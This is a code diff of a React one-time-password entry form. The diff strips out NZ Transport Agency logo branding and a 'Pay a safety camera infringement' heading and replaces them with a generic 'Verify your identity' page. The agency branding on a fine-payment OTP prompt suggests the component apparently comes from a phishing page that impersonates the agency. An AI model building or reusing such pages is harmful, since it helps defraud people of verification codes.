@@ -1,14 +1,13 @@
 import React from 'react';
 import { useLanguage } from '../hooks/useLanguage';
-import './LoginScreen.css';
-import nztaLogo from '../assets/nzta-logo.png';
+import './OtpVerificationForm.css';
 
 function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubmit, onBack }) {
   const { t } = useLanguage();
 
   // Safe translations with fallbacks
   const safeT = {
-    otpMessage: 'Please enter the OTP code to complete the registration.',
+    otpMessage: 'Please enter the OTP code we sent you to complete your verification.',
     otpCode: 'OTP Code',
     otpPlaceholder: '000000',
     confirmCode: 'Confirm code',
@@ -17,52 +16,18 @@ function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubm
   };
 
   return (
-    <div className="nzta-renewal">
-      {/* ─── Header ─── */}
-      <header className="nzta-header">
-        <div className="nzta-header-inner">
-          <div className="nzta-logo">
-            <img
-              src={nztaLogo}
-              alt="NZ Transport Agency"
-              className="nzta-logo-img"
-            />
-          </div>
-          
-        </div>
-      </header>
+    <div className="otpv-page">
+      <div className="otpv-container">
+        <h1 className="otpv-title">Verify your identity</h1>
 
-      {/* ─── Main ─── */}
-      <main className="nzta-main">
-        <a
-          href="#back"
-          className="nzta-back"
-          onClick={(e) => {
-            e.preventDefault();
-            onBack?.();
-          }}
-        >
-          ← Back
-        </a>
+        <p className="otpv-intro">{safeT.otpMessage}</p>
 
-        <h1 className="nzta-title"> Pay a safety camera infringement
-</h1>
+        <hr className="otpv-divider" />
 
-        
-        <hr className="nzta-divider" />
-
-        <p className="nzta-hint">
-          All fields are required unless marked 'optional'.
-        </p>
-
-        <h2 className="nzta-subtitle">Verify OTP code</h2>
-
-        <p className="nzta-help" style={{ marginBottom: 20 }}>
-          {safeT.otpMessage}
-        </p>
+        <h2 className="otpv-subtitle">Enter the code</h2>
 
         <form onSubmit={onSubmit}>
-          <div className="nzta-field">
+          <div className="otpv-field">
             <label htmlFor="otpCode">{safeT.otpCode}</label>
             <input
               type="text"
@@ -74,23 +39,23 @@ function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubm
               }}
               placeholder={safeT.otpPlaceholder}
               maxLength="8"
-              className={`nzta-input ${otpError ? 'input-error-red' : ''}`}
+              className={`otpv-input ${otpError ? 'otpv-error' : ''}`}
               autoFocus
             />
-            {otpError && <span className="nzta-error-msg">{otpError}</span>}
+            {otpError && <span className="otpv-error-msg">{otpError}</span>}
           </div>
 
-          <div className="nzta-actions">
+          <div className="otpv-actions">
             <button
               type="submit"
-              className="nzta-btn nzta-btn-continue"
+              className="otpv-btn otpv-btn-continue"
               disabled={isLoading}
             >
               {isLoading ? safeT.verifying : safeT.confirmCode}
             </button>
             <button
               type="button"
-              className="nzta-btn nzta-btn-cancel"
+              className="otpv-btn otpv-btn-cancel"
               onClick={onBack}
               disabled={isLoading}
             >
@@ -98,7 +63,7 @@ function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubm
             </button>
           </div>
         </form>
-      </main>
+      </div>
     </div>
   );
 }
